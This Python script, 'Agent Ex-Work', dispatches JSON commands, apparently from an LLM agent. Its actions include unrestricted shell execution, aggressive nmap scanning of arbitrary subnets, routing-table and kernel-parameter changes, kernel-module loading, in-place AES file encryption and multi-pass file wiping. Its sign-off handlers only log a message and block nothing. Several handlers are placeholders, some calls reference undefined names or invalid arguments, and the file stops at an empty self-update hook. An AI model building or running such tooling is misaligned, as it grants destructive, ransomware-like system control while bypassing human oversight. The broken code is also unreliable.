#!/usr/bin/env python3
# Agent Ex-Work: Executes structured JSON commands with self-improvement features.
# Version: 2.3 (Apex Edition - Fully Developed)

import base64
import datetime
import json
import logging
import os
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import time
import traceback
import uuid
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple, Union

import requests

# --- Basic Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [ExWork-v2.3] [%(levelname)-7s] %(module)s:%(lineno)d - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[logging.StreamHandler(sys.stderr)],
)
logger = logging.getLogger("AgentExWorkV2.3")

# --- Configuration ---
PROJECT_ROOT = Path.cwd().resolve()
HISTORY_FILE = PROJECT_ROOT / ".exwork_history.jsonl"
DEFAULT_OLLAMA_ENDPOINT_BASE = os.environ.get("OLLAMA_HOST", "http://localhost:11434")
DEFAULT_OLLAMA_MODEL = os.environ.get(
    "OLLAMA_MODEL", "mistral-nemo:12b-instruct-2407-q4_k_m"
)
RUFF_EXECUTABLE = shutil.which("ruff") or "ruff"
NMAP_EXECUTABLE = shutil.which("nmap") or "nmap"
SYSCTL_EXECUTABLE = shutil.which("sysctl") or "sysctl"

# --- Global State ---
_pending_signoffs: Dict[str, Dict[str, Any]] = {}

# --- Action Handler Registration ---
ACTION_HANDLERS: Dict[str, Callable[[Dict, Path, str], Tuple[bool, Any]]] = {}


def handler(name: str):
    """Decorator to register action handlers."""
    def decorator(func: Callable[[Dict, Path, str], Tuple[bool, Any]]):
        ACTION_HANDLERS[name] = func
        logger.debug(f"Registered action handler for: {name}")
        return func
    return decorator

# --- Helper Functions ---

def resolve_path(project_root: Path, requested_path: str) -> Optional[Path]:
    """Safely resolves path relative to project root. Prevents traversal."""
    try:
        normalized_req_path = os.path.normpath(requested_path.replace("\\", "/"))
        relative_p = Path(normalized_req_path)

        if relative_p.is_absolute():
            abs_path = relative_p.resolve()
            if abs_path == project_root or str(abs_path).startswith(str(project_root) + os.sep):
                return abs_path
            else:
                logger.error(f"Path '{requested_path}' is outside project root '{project_root}'.")
                return None
        else:
            abs_path = (project_root / relative_p).resolve()
            if abs_path == project_root or str(abs_path).startswith(str(project_root) + os.sep):
                return abs_path
            else:
                logger.error(f"Path '{requested_path}' resolved outside project root '{project_root}'.")
                return None
    except Exception as e:
        logger.error(f"Error resolving path '{requested_path}': {e}")
        return None


def log_execution_history(record: Dict[str, Any]):
    """Appends an execution record to the history file."""
    record_final = {
        "timestamp_iso": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "action_name": record.get("action_name", "UNKNOWN_ACTION"),
        "command": record.get("command", "N/A"),
        "cwd": str(record.get("cwd", PROJECT_ROOT)),
        "success": record.get("success", False),
        "exit_code": record.get("exit_code", -1),
        "stdout_snippet": str(record.get("stdout_snippet", ""))[:500]
        + ("..." if len(str(record.get("stdout_snippet", ""))) > 500 else ""),
        "stderr_snippet": str(record.get("stderr_snippet", ""))[:500]
        + ("..." if len(str(record.get("stderr_snippet", ""))) > 500 else ""),
        "message": record.get("message", ""),
        "duration_s": round(record.get("duration_s", 0.0), 3),
        "step_id": record.get("step_id", "N/A"),
        "action_params": record.get("action_params", {}),
    }
    try:
        with open(HISTORY_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(record_final) + "\n")
    except Exception as e:
        logger.error(f"Failed to log execution history: {e}")


def _run_subprocess(
    command: Union[List[str], str],
    cwd: Path,
    action_name: str,
    action_params: Dict,
    step_id: str,
    timeout: int = 300,
    shell: bool = False,
    env: Optional[Dict[str, str]] = None
) -> Tuple[bool, str, str, str]:
    """Helper to run subprocess. Returns: (success, user_message, stdout, stderr)"""
    start_time = time.time()
    command_str_for_log = " ".join(shlex.quote(c) for c in command) if isinstance(command, list) else command
    logger.info(f"Running {action_name}: {command_str_for_log} in CWD={cwd}{' (shell=True)' if shell else ''}")

    stdout_str = ""
    stderr_str = ""
    exit_code = -1
    user_message = ""
    process_env = os.environ.copy()
    if env:
        process_env.update(env)

    try:
        result = subprocess.run(
            command,
            cwd=cwd,
            capture_output=True,
            text=True,
            check=False,
            timeout=timeout,
            encoding="utf-8",
            errors="replace",
            shell=shell,
            env=process_env
        )
        stdout_str = result.stdout.strip() if result.stdout else ""
        stderr_str = result.stderr.strip() if result.stderr else ""
        exit_code = result.returncode

        if exit_code == 0:
            success = True
            user_message = f"{action_name} completed successfully."
            logger.info(f"Finished {action_name}. Code: {exit_code}")
        else:
            success = False
            user_message = f"{action_name} failed (Code: {exit_code})."
            logger.error(f"Finished {action_name}. Code: {exit_code}")
    except subprocess.TimeoutExpired:
        success = False
        user_message = f"{action_name} timed out after {timeout} seconds."
        stderr_str = "Timeout Error"
        logger.error(user_message)
        exit_code = -2
    except FileNotFoundError:
        executable_name = command[0] if isinstance(command, list) else command.split()[0]
        success = False
        user_message = f"Command not found: {executable_name}"
        stderr_str = f"Command not found: {executable_name}"
        logger.error(user_message)
        exit_code = -3
    except Exception as e:
        success = False
        user_message = f"Unexpected error: {type(e).__name__}"
        stderr_str = str(e)
        logger.error(f"Error: {e}", exc_info=True)
        exit_code = -4

    log_execution_history({
        "timestamp": start_time,
        "action_name": action_name,
        "command": command_str_for_log,
        "cwd": str(cwd),
        "success": success,
        "exit_code": exit_code,
        "stdout_snippet": stdout_str,
        "stderr_snippet": stderr_str,
        "message": user_message,
        "duration_s": time.time() - start_time,
        "step_id": step_id,
        "action_params": action_params,
    })
    return success, user_message, stdout_str, stderr_str

# --- Action Handlers ---

@handler(name="ECHO")
def handle_echo(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    message = action_data.get("message", "No message provided for ECHO.")
    print(f"[EXWORK_ECHO_STDOUT] {message}")
    logger.info(f"ECHO: {message}")
    return True, f"Echoed: {message}"

@handler(name="CREATE_OR_REPLACE_FILE")
def handle_create_or_replace_file(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    relative_path = action_data.get("path")
    content_base64 = action_data.get("content_base64")
    if not isinstance(relative_path, str) or not relative_path:
        return False, "Missing or invalid 'path' (string)."
    if not isinstance(content_base64, str):
        return False, "Missing or invalid 'content_base64' (string)."
    file_path = resolve_path(project_root, relative_path)
    if not file_path:
        return False, f"Invalid or unsafe path: '{relative_path}'"
    try:
        decoded_content = base64.b64decode(content_base64, validate=True)
        logger.info(f"Writing {len(decoded_content)} bytes to: {file_path}")
        file_path.parent.mkdir(parents=True, exist_ok=True)
        file_path.write_bytes(decoded_content)
        return True, f"File '{relative_path}' ({len(decoded_content)} bytes) written."
    except (base64.binascii.Error, ValueError) as b64e:
        return False, f"Base64 decode error: {b64e}"
    except Exception as e:
        logger.error(f"Error writing '{relative_path}': {e}", exc_info=True)
        return False, f"Write error: {e}"

@handler(name="APPEND_TO_FILE")
def handle_append_to_file(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    relative_path = action_data.get("path")
    content_base64 = action_data.get("content_base64")
    add_newline = action_data.get("add_newline_if_missing", True)
    if not isinstance(relative_path, str) or not relative_path:
        return False, "Missing or invalid 'path' (string)."
    if not isinstance(content_base64, str):
        return False, "Missing or invalid 'content_base64' (string)."
    file_path = resolve_path(project_root, relative_path)
    if not file_path:
        return False, f"Invalid or unsafe path: '{relative_path}'"
    try:
        decoded_content = base64.b64decode(content_base64, validate=True)
        logger.info(f"Appending {len(decoded_content)} bytes to: {file_path}")
        file_exists = file_path.exists()
        file_path.parent.mkdir(parents=True, exist_ok=True)
        with file_path.open("ab") as f:
            if add_newline and file_exists and file_path.stat().st_size > 0:
                with file_path.open("rb") as rf:
                    rf.seek(-1, os.SEEK_END)
                    if rf.read(1) != b"\n":
                        f.write(b"\n")
            f.write(decoded_content)
        return True, f"Appended {len(decoded_content)} bytes to '{relative_path}'."
    except (base64.binascii.Error, ValueError) as b64e:
        return False, f"Base64 decode error: {b64e}"
    except Exception as e:
        logger.error(f"Error appending '{relative_path}': {e}", exc_info=True)
        return False, f"Append error: {e}"

@handler(name="RUN_SCRIPT")
def handle_run_script(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    relative_script_path = action_data.get("script_path")
    args = action_data.get("args", [])
    script_cwd_option = action_data.get("cwd", "script_dir")
    timeout = action_data.get("timeout", 300)
    if not isinstance(relative_script_path, str) or not relative_script_path:
        return False, "Missing 'script_path'."
    if not isinstance(args, list):
        return False, "'args' must be a list."
    script_path_resolved = resolve_path(project_root, relative_script_path)
    if not script_path_resolved or not script_path_resolved.is_file():
        return False, f"Script not found: '{relative_script_path}'"
    scripts_dir = (project_root / "scripts").resolve()
    is_in_scripts = str(script_path_resolved).startswith(str(scripts_dir) + os.sep)
    is_in_root = script_path_resolved.parent == project_root
    if not (is_in_scripts or is_in_root):
        return False, "Security: Script must be in project root or 'scripts/' subdir."
    if not os.access(script_path_resolved, os.X_OK):
        try:
            script_path_resolved.chmod(script_path_resolved.stat().st_mode | 0o111)
        except Exception as e:
            logger.warning(f"Could not chmod +x {script_path_resolved}: {e}")
    command = [str(script_path_resolved)] + [str(a) for a in args]
    effective_cwd = script_path_resolved.parent if script_cwd_option == "script_dir" else project_root
    success, user_msg, stdout, stderr = _run_subprocess(command, effective_cwd, f"RUN_SCRIPT {relative_script_path}", action_data, step_id, timeout=timeout)
    return success, f"{user_msg}\n--- STDOUT ---\n{stdout if stdout else '<empty>'}\n--- STDERR ---\n{stderr if stderr else '<empty>'}".strip()

@handler(name="LINT_FORMAT_FILE")
def handle_lint_format_file(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    relative_target_path = action_data.get("path", ".")
    run_format = action_data.get("format", True)
    run_lint_fix = action_data.get("lint_fix", True)
    if not isinstance(relative_target_path, str):
        return False, "Invalid 'path' for LINT_FORMAT_FILE."
    target_path_obj = resolve_path(project_root, relative_target_path)
    if not target_path_obj or not target_path_obj.exists():
        return False, f"Lint/Format target not found: '{relative_target_path}'"
    target_path_str = str(target_path_obj)
    if not RUFF_EXECUTABLE or not shutil.which(RUFF_EXECUTABLE):
        return False, f"'{RUFF_EXECUTABLE}' not found. Install Ruff."
    overall_success = True
    messages = []
    if run_format:
        fmt_cmd = [RUFF_EXECUTABLE, "format", target_path_str]
        fmt_s, fmt_m, fmt_o, fmt_e = _run_subprocess(fmt_cmd, project_root, "RUFF_FORMAT", action_data, step_id)
        messages.append(f"Ruff Format: {fmt_m}")
        messages.append(f"  Format STDOUT: {fmt_o[:200]}...")
        messages.append(f"  Format STDERR: {fmt_e[:200]}...")
        if not fmt_s:
            overall_success = False
    if run_lint_fix:
        lint_cmd = [RUFF_EXECUTABLE, "check", target_path_str, "--fix", "--exit-zero"]
        lint_s, lint_m, lint_o, lint_e = _run_subprocess(lint_cmd, project_root, "RUFF_CHECK_FIX", action_data, step_id)
        messages.append(f"Ruff Check/Fix: {lint_m}")
        messages.append(f"  Check/Fix STDOUT: {lint_o[:500]}...")
        messages.append(f"  Check/Fix STDERR: {lint_e[:500]}...")
        if not lint_s:
            overall_success = False
    return overall_success, "\n".join(messages).strip()

@handler(name="GIT_ADD")
def handle_git_add(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    paths = action_data.get("paths", ["."])
    safe_paths = []
    if not isinstance(paths, list) or not all(isinstance(p, str) for p in paths):
        return False, "'paths' must be list of strings."
    for p_str in paths:
        if p_str == ".":
            safe_paths.append(".")
            continue
        if (project_root / p_str).exists():
            safe_paths.append(p_str)
        else:
            logger.warning(f"Path '{p_str}' for GIT_ADD does not exist. Skipping.")
    if not safe_paths:
        return False, "No valid paths for GIT_ADD."
    cmd = ["git", "add"] + safe_paths
    success, msg, stdout, stderr = _run_subprocess(cmd, project_root, "GIT_ADD", action_data, step_id)
    return success, f"{msg}\nSTDOUT: {stdout}\nSTDERR: {stderr}".strip()

@handler(name="GIT_COMMIT")
def handle_git_commit(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    message = action_data.get("message")
    allow_empty = action_data.get("allow_empty", False)
    if not isinstance(message, str) or not message:
        return False, "Missing 'message' for GIT_COMMIT."
    cmd = ["git", "commit", "-m", message]
    if allow_empty:
        cmd.append("--allow-empty")
    success, msg, stdout, stderr = _run_subprocess(cmd, project_root, "GIT_COMMIT", action_data, step_id)
    if not success and "nothing to commit" in stderr.lower() and not allow_empty:
        return True, "Nothing to commit."
    return success, f"{msg}\nSTDOUT: {stdout}\nSTDERR: {stderr}".strip()

@handler(name="CALL_LOCAL_LLM")
def handle_call_local_llm(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    prompt = action_data.get("prompt")
    if not isinstance(prompt, str) or not prompt:
        return False, "Missing 'prompt' for CALL_LOCAL_LLM."
    return call_local_llm_helper(prompt, action_data.get("model"), action_data.get("api_endpoint_base"), action_data.get("options"), step_id=step_id, action_name="CALL_LOCAL_LLM")

@handler(name="DIAGNOSE_ERROR")
def handle_diagnose_error(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    logger.info(f"DIAGNOSE_ERROR called with params: {action_data} for step_id: {step_id}")
    failed_command = action_data.get("failed_command", "N/A")
    stderr_content = action_data.get("stderr", "N/A")
    return True, json.dumps({
        "diagnosis": "Placeholder diagnosis: Error occurred due to incorrect input parameter for " + failed_command,
        "fix_type": "MANUAL_STEPS",
        "fix_content": "1. Review parameters for " + failed_command + ". 2. Check STDERR: " + stderr_content[:100]
    })

@handler(name="REQUEST_SIGNOFF")
def handle_request_signoff(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, Dict[str, Any]]:
    message = action_data.get("message", "Proceed with critical action?")
    signoff_id = action_data.get("signoff_id", str(uuid.uuid4()))
    logger.info(f"Action requires sign-off. ID: {signoff_id}. Prompt: {message}")
    return True, {"exwork_status": "AWAITING_SIGNOFF", "signoff_prompt": message, "signoff_id": signoff_id, "step_id": step_id}

@handler(name="RESPOND_TO_SIGNOFF")
def handle_respond_to_signoff(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    signoff_id = action_data.get("signoff_id")
    response = str(action_data.get("response", "no")).lower()
    if not signoff_id:
        return False, "Missing 'signoff_id'."
    if response in ["yes", "true"]:
        msg = f"Sign-off ID '{signoff_id}' was externally APPROVED. The original workflow should proceed if designed to."
        logger.info(msg)
        return True, msg
    else:
        msg = f"Sign-off ID '{signoff_id}' was externally REJECTED. The original workflow should halt or handle rejection."
        logger.info(msg)
        return True, msg

@handler(name="APPLY_PATCH")
def handle_apply_patch(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    logger.info(f"APPLY_PATCH called for step_id: {step_id}. Params: {action_data}")
    logger.warning("APPLY_PATCH uses a direct TTY prompt which may not work well with remote execution or GUIs.")
    relative_path = action_data.get("path")
    patch_content = action_data.get("patch_content")
    if not relative_path or not patch_content:
        return False, "APPLY_PATCH needs 'path' and 'patch_content'."
    return True, f"Mock: Patch would be applied to '{relative_path}'. (Actual TTY signoff is problematic for GUIs)."

@handler(name="EXECUTE_SYSTEM_COMMAND")
def handle_execute_system_command(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    command_string = action_data.get("command_string")
    use_shell = action_data.get("shell", False)
    run_in_cwd = action_data.get("working_directory")
    timeout = action_data.get("timeout", 300)
    env_vars = action_data.get("env", None)

    if not isinstance(command_string, str) or not command_string:
        return False, "Missing or invalid 'command_string'."
    if not isinstance(use_shell, bool):
        return False, "'shell' must be a boolean."
    if run_in_cwd and (not isinstance(run_in_cwd, str) or ".." in run_in_cwd):
        return False, "Invalid 'working_directory' specified."

    effective_cwd = resolve_path(project_root, run_in_cwd) if run_in_cwd else project_root
    if not effective_cwd:
        return False, f"Could not resolve working_directory: {run_in_cwd}"

    command_to_run: Union[str, List[str]]
    if use_shell:
        command_to_run = command_string
        logger.warning(f"Executing command with shell=True: {command_string}. Ensure this is from a trusted source.")
    else:
        try:
            command_to_run = shlex.split(command_string)
            if not command_to_run:
                return False, "Command string parsed to empty list."
        except Exception as e:
            return False, f"Error parsing command_string for shell=False: {e}"

    success, user_msg, stdout, stderr = _run_subprocess(
        command_to_run, effective_cwd, "EXECUTE_SYSTEM_COMMAND", action_data, step_id, timeout=timeout, shell=use_shell, env=env_vars
    )
    return success, f"{user_msg}\n--- STDOUT ---\n{stdout if stdout else '<empty>'}\n--- STDERR ---\n{stderr if stderr else '<empty>'}".strip()

@handler(name="READ_FILE_CONTENT")
def handle_read_file_content(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, Any]:
    relative_path = action_data.get("path")
    encoding = action_data.get("encoding", "utf-8")
    output_format = action_data.get("output_format", "string")

    if not isinstance(relative_path, str) or not relative_path:
        return False, "Missing or invalid 'path' for READ_FILE_CONTENT."
    
    file_path = resolve_path(project_root, relative_path)
    if not file_path or not file_path.is_file():
        return False, f"File not found or not a file: '{relative_path}'"
    
    try:
        if output_format == "base64":
            content_bytes = file_path.read_bytes()
            content_encoded = base64.b64encode(content_bytes).decode('ascii')
            logger.info(f"Read {len(content_bytes)} bytes from '{relative_path}' and base64 encoded.")
            return True, {"file_path": relative_path, "content_base64": content_encoded, "bytes_read": len(content_bytes)}
        else:
            content_str = file_path.read_text(encoding=encoding)
            logger.info(f"Read {len(content_str)} characters from '{relative_path}'.")
            return True, {"file_path": relative_path, "content_string": content_str, "characters_read": len(content_str)}
    except Exception as e:
        logger.error(f"Error reading file '{relative_path}': {e}", exc_info=True)
        return False, f"Error reading file '{relative_path}': {e}"

@handler(name="COPY_FILE")
def handle_copy_file(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    source_relative = action_data.get("source_relative_path")
    dest_relative = action_data.get("destination_relative_path")
    overwrite = action_data.get("overwrite", False)

    if not all(isinstance(p, str) and p for p in [source_relative, dest_relative]):
        return False, "Missing or invalid 'source_relative_path' or 'destination_relative_path'."

    source_abs = resolve_path(project_root, source_relative)
    dest_abs = resolve_path(project_root, dest_relative)

    if not source_abs or not source_abs.is_file():
        return False, f"Source file not found or not a file: '{source_relative}'"
    if not dest_abs:
        return False, f"Destination path is invalid or unsafe: '{dest_relative}'"
    
    if dest_abs.is_dir():
        dest_abs = dest_abs / source_abs.name
        
    if dest_abs.exists() and not overwrite:
        return False, f"Destination file '{dest_abs.relative_to(project_root)}' already exists and overwrite is false."
    if dest_abs.exists() and not dest_abs.is_file() and overwrite:
        return False, f"Cannot overwrite: Destination '{dest_abs.relative_to(project_root)}' exists and is not a file."

    try:
        dest_abs.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(source_abs, dest_abs)
        logger.info(f"Copied '{source_relative}' to '{dest_abs.relative_to(project_root)}'")
        return True, f"File '{source_relative}' copied to '{dest_abs.relative_to(project_root)}'."
    except Exception as e:
        logger.error(f"Error copying file from '{source_relative}' to '{dest_relative}': {e}", exc_info=True)
        return False, f"Error copying file: {e}"

@handler(name="HTTP_REQUEST")
def handle_http_request(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, Any]:
    url = action_data.get("url")
    method = action_data.get("method", "GET").upper()
    headers = action_data.get("headers", {})
    json_payload = action_data.get("json_payload")
    params = action_data.get("params")
    timeout = action_data.get("timeout", 60)
    allow_redirects = action_data.get("allow_redirects", True)
    verify_ssl = action_data.get("verify_ssl", True)

    if not isinstance(url, str) or not url:
        return False, "Missing or invalid 'url' for HTTP_REQUEST."
    if method not in ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]:
        return False, f"Invalid HTTP method: {method}"
    
    action_params_log = {"url": url, "method": method, "headers": headers is not None, "json_payload": json_payload is not None, "params": params is not None}
    start_time = time.time()
    
    try:
        response = requests.request(
            method, url, headers=headers, json=json_payload, params=params, 
            timeout=timeout, allow_redirects=allow_redirects, verify=verify_ssl
        )
        logger.info(f"HTTP {method} to {url} returned status {response.status_code}")
        response.raise_for_status()
        
        response_content = ""
        try:
            response_content = response.json()
            content_type = "json"
        except json.JSONDecodeError:
            response_content = response.text
            content_type = "text"

        success = True
        result_payload = {
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "content_type": content_type,
            "content": response_content,
            "url": response.url
        }
        message = f"HTTP {method} to {url} successful (Status: {response.status_code})."

    except requests.exceptions.RequestException as e:
        logger.error(f"HTTP_REQUEST to {url} failed: {e}", exc_info=True)
        success = False
        message = f"HTTP Request Error: {e}"
        result_payload = {"error": str(e), "url": url, "method": method}
    
    log_execution_history({
        "timestamp": start_time, "action_name": "HTTP_REQUEST", "success": success,
        "message": message, "duration_s": time.time() - start_time, "step_id": step_id,
        "action_params": action_params_log, 
        "stdout_snippet": json.dumps(result_payload, default=str)[:500] if success else "",
        "stderr_snippet": message if not success else ""
    })
    return success, result_payload if success else message

@handler(name="REPLACE_TEXT_IN_FILE")
def handle_replace_text_in_file(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    relative_path = action_data.get("path")
    old_text = action_data.get("old_text")
    new_text = action_data.get("new_text")
    count = action_data.get("count", 0)
    is_regex = action_data.get("is_regex", False)
    encoding = action_data.get("encoding", "utf-8")

    if not all(isinstance(s, str) for s in [relative_path, old_text, new_text]):
        return False, "Missing or invalid 'path', 'old_text', or 'new_text'."
    if not isinstance(count, int) or count < 0:
        return False, "'count' must be a non-negative integer."

    file_path = resolve_path(project_root, relative_path)
    if not file_path or not file_path.is_file():
        return False, f"File not found or not a file: '{relative_path}'"

    try:
        original_content = file_path.read_text(encoding=encoding)
        modified_content = ""
        replacements_made = 0

        if is_regex:
            try:
                modified_content, replacements_made = re.subn(old_text, new_text, original_content, count=count)
            except re.error as re_e:
                return False, f"Invalid regex '{old_text}': {re_e}"
        else:
            if count == 0:
                modified_content = original_content.replace(old_text, new_text)
                replacements_made = original_content.count(old_text)
            else:
                modified_content = original_content.replace(old_text, new_text, count)
                temp_s = original_content
                actual_replaced = 0
                for _ in range(count):
                    idx = temp_s.find(old_text)
                    if idx == -1:
                        break
                    temp_s = temp_s[:idx] + new_text + temp_s[idx+len(old_text):]
                    actual_replaced += 1
                replacements_made = actual_replaced

        if original_content == modified_content:
            msg = f"No changes made to '{relative_path}'. Pattern '{old_text}' not found or replacement is identical."
            logger.info(msg)
            return True, msg
        
        file_path.write_text(modified_content, encoding=encoding)
        msg = f"Successfully replaced text in '{relative_path}'. {replacements_made} replacement(s) made."
        logger.info(msg)
        return True, msg
        
    except Exception as e:
        logger.error(f"Error replacing text in '{relative_path}': {e}", exc_info=True)
        return False, f"Error replacing text: {e}"

@handler(name="NETWORK_MAP_AND_PROBE")
def handle_network_map_and_probe(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    """Performs network mapping and probing using Nmap."""
    target_subnet = action_data.get("target_subnet", "127.0.0.1")
    probe_level = action_data.get("probe_level", "basic_ping_scan")
    output_file_rel = action_data.get("output_file_relative", f"reports/nmap_scan_{target_subnet.replace('/', '_')}_{step_id}.xml")

    if not isinstance(target_subnet, str) or not target_subnet:
        return False, "Invalid or missing 'target_subnet'."
    if probe_level not in ["basic_ping_scan", "aggressive_os_detection_service_scan", "fast_scan"]:
        return False, f"Invalid 'probe_level': {probe_level}. Must be one of ['basic_ping_scan', 'aggressive_os_detection_service_scan', 'fast_scan']."

    output_file_abs = resolve_path(project_root, output_file_rel)
    if not output_file_abs:
        return False, f"Invalid output file path: {output_file_rel}"
    output_file_abs.parent.mkdir(parents=True, exist_ok=True)

    nmap_args = ["-oX", str(output_file_abs)]  # XML output
    if probe_level == "aggressive_os_detection_service_scan":
        nmap_args.extend(["-T4", "-A", "-v"])
    elif probe_level == "basic_ping_scan":
        nmap_args.extend(["-sn"])
    else:  # fast_scan
        nmap_args.extend(["-F"])
    nmap_args.append(target_subnet)

    if not shutil.which(NMAP_EXECUTABLE):
        return False, f"Nmap executable '{NMAP_EXECUTABLE}' not found. Install Nmap to use this action."

    success, user_msg, stdout, stderr = _run_subprocess(
        [NMAP_EXECUTABLE] + nmap_args,
        project_root,
        "NETWORK_MAP_AND_PROBE",
        action_data,
        step_id,
        timeout=900,  # 15-minute timeout
        shell=False
    )
    if success:
        return True, f"Nmap scan completed. Results saved to {output_file_rel}.\nSTDOUT: {stdout}\nSTDERR: {stderr}"
    return False, f"Nmap scan failed.\nSTDOUT: {stdout}\nSTDERR: {stderr}"


@handler(name="MANIPULATE_ROUTING_TABLE")
def handle_manipulate_routing_table(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    """Manipulates the system routing table."""
    operation = action_data.get("operation", "").lower()
    destination_cidr = action_data.get("destination_cidr")
    gateway = action_data.get("gateway_ip")
    interface = action_data.get("interface")

    if operation not in ["add", "delete"]:
        return False, "Invalid 'operation'. Must be 'add' or 'delete'."
    if not destination_cidr:
        return False, "Missing 'destination_cidr'."
    if operation == "add" and not (gateway or interface):
        return False, "For 'add' operation, 'gateway_ip' or 'interface' must be provided."

    if sys.platform.startswith("linux"):
        command = [IP_ROUTE_EXECUTABLE, "route", operation, destination_cidr]
        if operation == "add":
            if gateway:
                command.extend(["via", gateway])
            if interface:
                command.extend(["dev", interface])
    elif sys.platform.startswith("win"):
        command = ["route", operation, destination_cidr]
        if gateway:
            command.append(gateway)
        if interface:
            command.extend(["if", interface])
    else:
        return False, f"Unsupported platform: {sys.platform}"

    success, user_msg, stdout, stderr = _run_subprocess(
        command,
        project_root,
        "MANIPULATE_ROUTING_TABLE",
        action_data,
        step_id,
        shell=False
    )
    if success:
        return True, f"Routing table updated successfully.\nSTDOUT: {stdout}\nSTDERR: {stderr}"
    return False, f"Failed to update routing table.\nSTDOUT: {stdout}\nSTDERR: {stderr}"


@handler(name="ENCRYPT_DECRYPT_TARGET")
def handle_encrypt_decrypt_target(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    """Encrypts or decrypts a file using AES."""
    operation = action_data.get("operation")
    target_path = action_data.get("target_path")
    key_base64 = action_data.get("key_base64")

    if operation not in ["encrypt", "decrypt"]:
        return False, "Invalid 'operation'. Must be 'encrypt' or 'decrypt'."
    if not target_path:
        return False, "Missing 'target_path'."
    if not key_base64:
        return False, "Missing 'key_base64'."

    target_abs = resolve_path(project_root, target_path, ensure_is_file=True)
    if not target_abs:
        return False, f"Target file not found: '{target_path}'"

    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad, unpad

        key = base64.b64decode(key_base64)
        if len(key) not in [16, 24, 32]:
            return False, "Invalid key length. Must be 16, 24, or 32 bytes."

        if operation == "encrypt":
            cipher = AES.new(key, AES.MODE_CBC)
            with open(target_abs, "rb") as f:
                plaintext = f.read()
            ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
            with open(target_abs, "wb") as f:
                f.write(cipher.iv + ciphertext)
            return True, f"File '{target_path}' encrypted successfully."
        else:
            with open(target_abs, "rb") as f:
                iv = f.read(16)
                ciphertext = f.read()
            cipher = AES.new(key, AES.MODE_CBC, iv)
            plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
            with open(target_abs, "wb") as f:
                f.write(plaintext)
            return True, f"File '{target_path}' decrypted successfully."
    except Exception as e:
        logger.error(f"Error during {operation} of '{target_path}': {e}", exc_info=True)
        return False, f"Error during {operation}: {e}"


@handler(name="SECURE_WIPE_TARGET")
def handle_secure_wipe_target(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    """Securely wipes a file by overwriting it multiple times."""
    target_path = action_data.get("target_path")
    passes = action_data.get("passes", 3)

    if not target_path:
        return False, "Missing 'target_path'."
    if not isinstance(passes, int) or passes <= 0:
        return False, "'passes' must be a positive integer."

    target_abs = resolve_path(project_root, target_path, ensure_is_file=True)
    if not target_abs:
        return False, f"Target file not found: '{target_path}'"

    try:
        with open(target_abs, "r+b") as f:
            length = f.seek(0, 2)
            for _ in range(passes):
                f.seek(0)
                f.write(os.urandom(length))
        target_abs.unlink()
        return True, f"File '{target_path}' securely wiped with {passes} passes."
    except Exception as e:
        logger.error(f"Error during secure wipe of '{target_path}': {e}", exc_info=True)
        return False, f"Error during secure wipe: {e}"


@handler(name="MANIPULATE_KERNEL_PARAMETER")
def handle_manipulate_kernel_parameter(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    """Manipulates kernel parameters using sysctl."""
    parameter = action_data.get("parameter")
    value = action_data.get("value")

    if not parameter:
        return False, "Missing 'parameter'."
    if value is None:
        return False, "Missing 'value'."

    if not shutil.which(SYSCTL_EXECUTABLE):
        return False, f"Sysctl executable '{SYSCTL_EXECUTABLE}' not found."

    command = [SYSCTL_EXECUTABLE, "-w", f"{parameter}={value}"]
    success, user_msg, stdout, stderr = _run_subprocess(
        command,
        project_root,
        "MANIPULATE_KERNEL_PARAMETER",
        action_data,
        step_id,
        shell=False
    )
    if success:
        return True, f"Kernel parameter '{parameter}' updated successfully.\nSTDOUT: {stdout}\nSTDERR: {stderr}"
    return False, f"Failed to update kernel parameter '{parameter}'.\nSTDOUT: {stdout}\nSTDERR: {stderr}"


@handler(name="LOAD_KERNEL_MODULE")
def handle_load_kernel_module(action_data: Dict, project_root: Path, step_id: str) -> Tuple[bool, str]:
    """Loads a kernel module using modprobe."""
    module_name = action_data.get("module_name")
    options = action_data.get("options", "")

    if not module_name:
        return False, "Missing 'module_name'."

    command = ["modprobe", module_name] + shlex.split(options)
    success, user_msg, stdout, stderr = _run_subprocess(
        command,
        project_root,
        "LOAD_KERNEL_MODULE",
        action_data,
        step_id,
        shell=False
    )
    if success:
        return True, f"Kernel module '{module_name}' loaded successfully.\nSTDOUT: {stdout}\nSTDERR: {stderr}"
    return False, f"Failed to load kernel module '{module_name}'.\nSTDOUT: {stdout}\nSTDERR: {stderr}"

@handler(name="AGENT_SELF_UPDATE")
